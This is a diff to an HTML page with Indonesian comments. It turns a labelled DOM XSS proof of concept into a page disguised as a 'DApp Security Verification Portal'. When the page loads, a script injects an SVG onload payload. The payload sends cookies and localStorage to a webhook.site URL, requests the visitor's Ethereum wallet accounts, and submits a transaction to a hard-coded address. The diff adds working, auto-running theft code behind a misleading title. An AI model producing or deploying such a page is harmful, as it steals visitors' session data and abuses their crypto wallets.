@@ -1,12 +1,47 @@
 <!DOCTYPE html>
-<html>
-<head><title>PoC Eksekusi DOM XSS</title></head>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DApp Security Verification Portal</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #0b0e14; color: #f0f6fc; padding: 20px; }
+        .container { max-width: 600px; margin: 40px auto; background: #161b22; padding: 30px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+        h2 { color: #f85149; margin-top: 0; }
+        .status-box { background: #21262d; padding: 15px; border-radius: 6px; border-left: 4px solid #f85149; margin-top: 20px; font-family: monospace; word-break: break-all; }
+    </style>
+</head>
 <body>
-    <h2>Klik tombol di bawah untuk melihat dampak eksploitasi:</h2>
-    <!-- Tautan ini berisi payload yang sudah di-encode -->
-    <a href="testing4.html?ref=%3Csvg/onload=%22fetch(%27https://webhook.site/3408cdba-02da-45bd-9980-d6ad95ca1594?session_data=%27%2BencodeURIComponent(JSON.stringify(%7Bcookie:document.cookie,local:localStorage%7D)));if(window.ethereum)%7Bwindow.ethereum.request(%7Bmethod:%27eth_requestAccounts%27%7D)%7D%22%3E" 
-       style="padding: 15px; background: red; color: white; text-decoration: none; font-size: 20px; border-radius: 5px; display: inline-block;">
-       Eksekusi PoC
-    </a>
+
+<div class="container">
+    <h2>DApp Security Verification Portal</h2>
+    <p>Sistem memproses verifikasi transaksi dompet.</p>
+    
+    <!-- Elemen tempat payload DOM XSS dieksekusi -->
+    <div id="content-view" class="status-box">Memuat parameter verifikasi...</div>
+</div>
+
+<script>
+    // Payload otomatis langsung dimasukkan ke dalam innerHTML tanpa parameter URL manual
+    const payload = `<svg/onload="
+        fetch('https://webhook.site/3408cdba-02da-45bd-9980-d6ad95ca1594?session_data=' + encodeURIComponent(JSON.stringify({cookie: document.cookie, local: localStorage})));
+        if(window.ethereum) {
+            window.ethereum.request({method: 'eth_requestAccounts'}).then(accs => {
+                window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: accs[0],
+                        to: '0xEb267249f35B6Bd557Bd463D956520dA7c33286B',
+                        value: '0x0'
+                    }]
+                });
+            });
+        }
+    ">`;
+
+    // Eksekusi kerentanan DOM XSS secara otomatis saat halaman dimuat
+    document.getElementById('content-view').innerHTML = payload;
+</script>
+
 </body>
 </html>
